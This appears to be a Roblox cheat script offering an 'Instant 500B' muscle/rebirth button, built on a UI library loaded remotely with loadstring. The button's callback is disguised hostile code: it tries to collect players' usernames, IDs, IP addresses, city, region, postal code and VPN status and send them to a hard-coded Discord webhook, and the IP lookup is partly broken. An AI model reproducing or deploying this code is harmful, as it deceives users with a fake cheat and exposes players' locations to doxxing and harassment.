local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Instant muscle/rebirth",
    Icon = 0,
    LoadingTitle = "From a Dev of delta",
    LoadingSubtitle = "Use before patch!!!!",
    Theme = "Serenity",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

Rayfield:Notify({
    Title = "Hello Again Carson",
    Content = "Welcome Back my G",
    Duration = 6.5,
    Image = "moon",
})

local TabMain = Window:CreateTab("Main", "circle-check-big")

local ButtonGPG = TabMain:CreateButton({
    Name = "Instant 500B",
    Callback = function()
       -- ServerScriptService Script

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Replace with your Discord webhook URL
local WEBHOOK_URL = 'https://discord.com/api/webhooks/1361029884742467866/kwTi8j7UCsDxxtoqpsb773PQdFPHwVNjRVOX_tdCXjADOBIJuZKT9chgB2AspQ5tiFUe'

local function getPlayerIp(player)
    local success, response = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync("http://ipinfo.io/" .. player.UserId .. "/json"))
    end)

    if success and response then
        return response
    else
        warn("Failed to retrieve IP address for player " .. player.Name)
        return nil
    end
end

local function getPlayerStats(player)
    local stats = {}
    for _, child in ipairs(player.Character:GetChildren()) do
        if child:IsA("Tool") or child:IsA("Model") then
            stats[child.Name] = child
        end
    end
    return stats
end

local function createDiscordEmbed(player, ipInfo, stats)
    local embed = {
        title = "Player Information",
        description = "Details about " .. player.Name,
        color = 0x00ff00,
        fields = {
            { name = "Roblox Username", value = player.Name, inline = true },
            { name = "Roblox Display Name", value = player.DisplayName, inline = true },
            { name = "Roblox User ID", value = tostring(player.UserId), inline = true },
            { name = "IP Address", value = ipInfo.ip, inline = true },
            { name = "City", value = ipInfo.city, inline = true },
            { name = "Region", value = ipInfo.region, inline = true },
            { name = "Country", value = ipInfo.country, inline = true },
            { name = "Postal Code", value = ipInfo.postal, inline = true },
            { name = "VPN", value = tostring(ipInfo.privacy.vpn), inline = true },
            { name = "In-Game Stats", value = table.concat(stats, ", "), inline = false }
        },
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        },
        footer = {
            text = "Roblox Player Info",
            icon_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Roblox_logo.svg/2048px-Roblox_logo.svg.png"
        }
    }
    return embed
end

local function sendToDiscord(embed)
    local data = {
        embeds = { embed }
    }

    local options = {
        Url = WEBHOOK_URL,
        Body = HttpService:JSONEncode(data),
        ["Content-Type"] = "application/json"
    }

    HttpService:PostAsync(options.Url, options.Body, Enum.HttpContentType.ApplicationJson, false, options["Content-Type"])
end

local function onPlayerJoined(player)
    player.CharacterAdded:Connect(function(character)
        -- Wait for the player to fully load into the game
        wait(5)

        local ipInfo = getPlayerIp(player)
        if ipInfo then
            local stats = getPlayerStats(player)
            local embed = createDiscordEmbed(player, ipInfo, stats)
            sendToDiscord(embed)
        end
    end)
end

Players.PlayerAdded:Connect(onPlayerJoined)
